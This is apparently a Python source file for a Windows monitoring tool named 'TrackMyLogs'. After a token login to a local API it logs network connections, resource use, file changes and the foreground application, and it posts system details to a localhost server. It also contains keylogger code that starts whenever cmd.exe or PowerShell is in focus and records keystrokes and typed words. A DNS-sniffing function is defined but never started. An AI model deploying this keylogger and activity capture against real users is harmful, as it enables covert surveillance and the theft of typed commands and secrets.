import threading
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from pynput import keyboard
import psutil
import time
import win32gui
import win32process
import wmi
from datetime import datetime
import platform
import socket
import tkinter as tk
from tkinter import ttk
import requests
from scapy.all import sniff, DNS, DNSQR
import pythoncom

# Global variables
word = ""
keylogger_running = False
stop_keylogger_flag = threading.Event()
auth_valid = False

def submit_token():
    global auth_valid
    email = token_entry_email.get()
    auth_token = token_entry_token.get()

    # Send the token in JSON format
    payload = {
        'email': email,
        'token': auth_token
    }

    try:
        response = requests.post('http://127.0.0.1:8000/api/submit-token/', json=payload)

        if response.status_code == 200:
            print("Token submitted successfully.")
            auth_valid = True
            auth_label.config(text="Authentication Successful!", fg="green")
        else:
            print(f"Failed to submit token: {response.status_code}")
            print(f"Response content: {response.text}")
            auth_label.config(text="Authentication Failed!", fg="red")
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")
        auth_label.config(text="Error in submission", fg="red")

# System information

def system_information():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
    }
    #for key, value in system_info.items():
        #print(f"{key}: {value}")

    try:
        response = requests.post("http://127.0.0.1:8000/api/submit-sysinfo/", json=system_info)
        if response.status_code == 200:
            print("System Information Submited Successfully.")
        else:
            print(f"Failed to submit System info: {response.status_code}")
            print(f"Response content: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")

def simple_wmi_query():
    try:
        pythoncom.CoInitialize() 
        c = wmi.WMI()
        for os in c.Win32_OperatingSystem():
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"OS Name: {os.Name}, Time: {now}")
    except Exception as e:
        print(f"Error during WMI query: {e}") 

# Network Activity Logs

def network_activity_logs():
    while True:
        connections = psutil.net_connections()
        for conn in connections:
            print(f"Local: {conn.laddr}, Remote: {conn.raddr}, Status: {conn.status}")
        time.sleep(10)

# Hardware and Resource Usage Logs

def hardware_usage_logs():
    while True:
        cpu_count = psutil.cpu_count()
        cpu_freq = psutil.cpu_freq()
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory()
        print(f"CPU Count: {cpu_count}, CPU Freq: {cpu_freq}, CPU Usage: {cpu_usage}%, Memory: {memory_usage}")
        time.sleep(5)

# DNS Monitoring

def dns_monitor(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # DNS query
        print(f"Domain Name: {packet[DNSQR].qname.decode('utf-8')}")

def start_dns_sniffing():
    sniff(filter="udp port 53", prn=dns_monitor, store=0)

# File System Monitoring

def monitor_directory(path='.'):
    def on_event(event):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if event.event_type == 'modified':
            print(f"File modified: {event.src_path}, Time: {now}")
        elif event.event_type == 'created':
            print(f"File created: {event.src_path}, Time: {now}")
        elif event.event_type == 'deleted':
            print(f"File deleted: {event.src_path}, Time: {now}")

    event_handler = FileSystemEventHandler()
    event_handler.on_any_event = on_event

    observer = Observer()
    observer.schedule(event_handler, path=path, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Keylogger

def on_press(key):
    global word
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char is not None:
            print(f"Key pressed: {key.char}, Time: {now}")
            word += key.char if key != keyboard.Key.space else ' '
        elif key == keyboard.Key.space:
            print(f"Word: {word}, Time: {now}")
            word = ""
    except AttributeError:
        print(f"Special key pressed: {key}, Time: {now}")

def on_release(key):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"Key released: {key}, Time: {now}")
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_keylogger_flag.is_set():
            time.sleep(0.1)
        listener.stop()

# App Monitoring

def get_current_app_name():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return process.name(), win32gui.GetWindowText(hwnd)
    except Exception as e:
        return None, str(e)

def monitor_apps():
    global keylogger_running
    last_app = None

    while True:
        app_name, window_title = get_current_app_name()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if app_name in ["cmd.exe", "powershell.exe"] and not keylogger_running:
            print(f"{app_name} opened. Starting keylogger. Time: {now}")
            keylogger_running = True
            stop_keylogger_flag.clear()
            threading.Thread(target=start_keylogger).start()
        elif app_name not in ["cmd.exe", "powershell.exe"] and keylogger_running:
            print(f"{app_name} closed. Stopping keylogger. Time: {now}")
            keylogger_running = False
            stop_keylogger_flag.set()

        if app_name != last_app:
            last_app = app_name
            print(f"App: '{window_title}' opened. Time: {now}")

        time.sleep(1)

# Main Function
def start_background_tasks():
    threading.Thread(target=simple_wmi_query, daemon=True).start()
    threading.Thread(target=system_information, daemon=True).start()
    threading.Thread(target=monitor_apps, daemon=True).start()
    threading.Thread(target=network_activity_logs, daemon=True).start()
    threading.Thread(target=hardware_usage_logs, daemon=True).start()
    threading.Thread(target=monitor_directory, daemon=True).start()

# GUI
def on_authenticate():
    global auth_valid
    email = token_entry_email.get()
    auth_token = token_entry_token.get()

    # Send the token in JSON format
    payload = {
        'email': email,
        'token': auth_token
    }

    try:
        response = requests.post('http://127.0.0.1:8000/api/submit-token/', json=payload)

        if response.status_code == 200:
            print("Token submitted successfully.")
            auth_valid = True
            auth_label.config(text="Authentication Successful!", fg="green")
            root.after(100, start_background_tasks)  # Start background tasks after auth success
        else:
            print(f"Failed to submit token: {response.status_code}")
            print(f"Response content: {response.text}")
            auth_label.config(text="Authentication Failed!", fg="red")
    except requests.exceptions.RequestException as e:
        print(f"Error during request: {e}")
        auth_label.config(text="Error in submission", fg="red")

if __name__ == "__main__":
    root = tk.Tk()
    root.title("TrackMyLogs")
    root.geometry("400x300")

    # Header
    header_label = tk.Label(root, text="TrackMyLogs Authentication Portal", font=("Arial", 16, "bold"), fg="#333")
    header_label.pack(pady=10)

    # Email Entry
    tk.Label(root, text="Email:", font=("Arial", 12)).pack(pady=5, anchor="w", padx=20)
    token_entry_email = tk.Entry(root, width=40, font=("Arial", 10))
    token_entry_email.pack(pady=5)

    # Token Entry
    tk.Label(root, text="Authentication Token:", font=("Arial", 12)).pack(pady=5, anchor="w", padx=20)
    token_entry_token = tk.Entry(root, width=40, font=("Arial", 10))
    token_entry_token.pack(pady=5)

    # Authentication Status Label
    auth_label = tk.Label(root, text="", font=("Arial", 10))
    auth_label.pack(pady=5)

    # Submit Button
    submit_button = tk.Button(root, text="Submit", command=on_authenticate, font=("Arial", 12), bg="#4CAF50", fg="white")
    submit_button.pack(pady=15)

    # Start the Tkinter main loop
    root.mainloop()